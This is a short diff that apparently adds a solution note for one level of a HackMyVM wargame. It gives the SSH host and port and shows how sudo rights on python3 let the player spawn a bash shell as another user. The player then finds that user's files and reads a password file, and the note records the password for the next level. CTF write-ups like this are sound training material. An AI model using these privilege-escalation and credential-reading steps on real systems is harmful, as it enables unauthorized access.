@@ -1,0 +1,11 @@
+Link or port:
+ssh asia@hades.hackmyvm.eu -p 6666
+Method of solve:
+We are given sudo permissions as the asteria user with the /usr/bin/python3 binary.
+We can use the oft-used python shell stabilization technique to open a shell as asteria
+sudo -l
+sudo -u asteria python3 -c 'import pty;pty.spawn("/bin/bash")'
+find / -group asteria 2>/dev/null | grep -v proc
+cat /usr/share/doc/asteria_pass.txt
+Passord for next level asteria
+hawMVJCYrBgoMAMVhuwT
